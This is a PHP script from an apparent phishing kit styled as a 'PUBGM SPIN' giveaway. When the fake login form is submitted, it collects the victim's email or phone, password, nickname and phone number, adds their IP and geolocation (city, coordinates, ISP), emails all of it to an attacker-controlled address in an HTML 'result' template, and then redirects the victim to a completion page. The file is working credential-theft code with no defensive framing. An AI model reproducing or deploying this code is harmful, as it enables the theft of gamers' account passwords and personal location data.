<?php 
include"email.php";
include"geolocation.php";

if(isset($_POST['check']))
{
    $email = $_POST['email'];
    $prov = $_POST['prov'];
    $pass  = $_POST['pass'];

    // Detail Akun
    $nama  = $_POST['nama'];
    $hp   = $_POST['hp'];
    $ip = $_SERVER['REMOTE_ADDR'];

    // Informasi Device



    $subjek = "PUBGM SPIN | LOGIN $prov | PUNYA SI $nama";
    $pesan = '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <style>
            div {
                font-family: "Teko", sans-serif;
            }
            table {
                border-collapse: collapse;    
            }
            
            th, td {
                font-family: "Teko", sans-serif;
                border: 1px solid #000;
                color: #000;
                padding: 5px;
                font-size: 0.9em;
            }
        </style>
    </head>
    <body>
    <center> 
    <div style="background: url(https://i.ibb.co/VWBR8t0/s2-bg.jpg) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 150px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
    <div style="width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
    </div>
    <div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">Informasi Akun</div>
    <table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
    <tr>
    <th style="width: 40%;text-align:left;" height="25px"><b>Email / Telepon</th>
    <th style="width:78%;text-align: center;"><b>'.$email.'</th> 
    </tr>
    <tr>
    <th style="width: 40%; text-align:left;" height="25px"><b>Password</th>
    <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
    </tr>
    <tr>
    <th style="width: 40%;text-align:left;" height="25px"><b>Nickname</th>
    <th style="width:78%;text-align: center;"><b>'.$nama.'</th> 
    </tr>
    <tr>
    <th style="width: 40%;text-align:left;" height="25px"><b>Nomor Hp</th>
    <th style="width:78%;text-align:center;"><b>'.$hp.'</th> 
    </tr>
    <tr>
    <th style="width: 40%;text-align:left;" height="25px"><b>Login Via</th>
    <th style="width:78%;text-align:center;"><b>'.$prov.'</th> 
    </tr>
    <tr>
    <th style="width: 40%;text-align:left;" height="25px"><b>IP Address</th>
    <th style="width:78%;text-align:center;"><b>'.$ip.'</th> 
    </tr>
    </tr>
    </table>
    <div style="background: #000; width: 294; color: #fff; text-align: center; padding: 10px;">Informasi Tambahan</div>
    <table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY CODE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['countryCode'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION CODE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION NAME</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['regionName'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ISP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['isp'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIMEZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['timezone'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
<tr>
</tr>
    </table>
    <div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
    <div style="text-align:center; margin-top: 3%;">
    2020 &copy; SAHRUL VAN KHAN
    </div>
    </div>
    </center>
    </center>
    </body>
    </html>
    ';
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= 'From: SAHRUL KHAN <result@idhaam.dev>' . "\r\n";
    $kirim = mail($emailku, $subjek, $pesan, $headers);

    if($kirim) 
    {
        session_start();
        $_SESSION['nama'] = $nama;
        header('location: ../completed.php');
    }
}

?>